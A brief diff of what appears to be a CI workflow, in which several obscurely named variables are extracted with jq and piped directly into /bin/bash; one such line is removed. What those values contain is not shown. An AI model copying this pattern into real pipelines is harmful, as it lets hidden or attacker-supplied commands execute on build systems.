@@ -23,7 +23,6 @@ jobs:
           echo $vj14 | jq -r .apa91 | /bin/bash
           printf '%s' "$p98" | jq -r .paa17963 | /bin/bash
           echo $mts4 | jq -r .oyohu237 | /bin/bash
-          echo $l32 | jq -r .x3936 | /bin/bash
           echo $carf849 | jq -r .k38 | /bin/bash
 
       - name: Store results
